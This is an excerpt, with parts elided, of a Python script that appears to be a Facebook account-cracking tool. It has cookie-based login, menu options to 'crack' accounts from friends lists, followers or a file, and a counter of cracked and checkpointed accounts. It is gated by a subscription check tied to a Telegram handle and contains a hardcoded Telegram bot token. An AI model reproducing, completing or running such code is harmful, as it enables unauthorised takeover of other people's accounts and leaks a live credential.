...
if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+'تم توقيف اداة راسل المبرمج لتفعيله \n❖ - https://t.me/J_O_P_A_4')
 print('\n\n')
 print(x)
 exit(0)
...
if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+'خلص اشتراك عليك مراجعة صانع اداة راجع جوبا ❖ - https://t.me/J_O_P_A_4')
    print('\n\n')
    print(x)
...
token1=input('\033[1;31mT\033[1;32mO\033[1;33mK\033[1;34mE\033[1;36mN\033[1;35m :\033[1;32m ')
print('\n')
print('\033[1;32mادخل ايدي بوتك')
ID1=input('\033[1;31mI\033[1;34mD \033[1;32m   : ')
print('\n')
token=('6374943559:AAFbgdunsjIc_RLwrZBExDzplgilCMv4L6o')
    ...
    def login_cokie(self):
        ...
        try:
            ...
            if 'href="/zero/optin/write/' in str(link):
                ...
                print("[✘]  cookie [NO]");time.sleep(2);self.login_cokie()
            ...
            if "me" in user:
                try:
                    ...
                    if "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan جوبا akun");time.sleep(2);self.menu()
                    else:
...
def menu(my_name,my_id):
	...
	print('Telegram ᯼ ❖ - @J_O_P_A_4')
	print('')
	print(f'>> Your ID : '+str(my_id))
	print(f'>> Your IP  : {ip}')
	print('')
	print('>> 1. Crack Publik : من الاصدقاء   ')
	print('>> 2. Crack Follower : من المتابعين ')
	print('>> 3. Crack File : من ملف        ')
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s{ [جوبا] %s/%s ➙ [OK] %s ➙ [CP] %s .. } %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
